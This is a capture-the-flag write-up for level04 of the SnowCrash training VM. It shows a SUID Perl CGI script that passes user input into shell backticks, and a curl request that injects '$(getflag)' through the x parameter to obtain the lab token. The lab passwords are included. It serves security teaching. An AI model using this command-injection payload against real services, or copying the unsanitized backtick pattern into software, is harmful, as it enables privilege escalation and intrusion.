# Level04

### shell injection

```
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
           _____                      _____               _     
          / ____|                    / ____|             | |    
         | (___  _ __   _____      _| |     _ __ __ _ ___| |__  
          \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \ 
          ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
         |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|
                                                        
  Good luck & Have fun

          192.168.1.50
level04@192.168.1.50's 
password: qi0maab88jeaj46qoumi7maus
level04@SnowCrash:~$ 
```
---

# level04

The binary/script has the SUID bit enabled:

-rwsr-sr-x 1 flag04 level04 level04.pl

The owner is `flag04`, so the script runs with flag04 privileges.

Using `strings` and `cat`, I found the Perl source code:

```perl
use CGI qw{param};

sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}

x(param("x"));
```

The script receives a parameter called x from a CGI request and passes it directly to a shell command using backticks.

Because the user input is not sanitized, this creates a command injection vulnerability.

The comment inside the script revealed the service is running on localhost port 4747.

I sent a malicious parameter using curl:

```
curl 'localhost:4747/?x=$(getflag)'
```

The server executed getflag with flag04 privileges and returned the token.

```
level04@SnowCrash:~$ getflag
Check flag.Here is your token : 
Nope there is no token here for you sorry. Try again :)
level04@SnowCrash:~$ curl 'localhost:4747/?x=$(getflag)'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
level04@SnowCrash:~$ 
```


---
### Next Password for ssh level05@192.168.1.50 -p 4242
### password: ne2searoevaevoem4ov4ar8ap
---
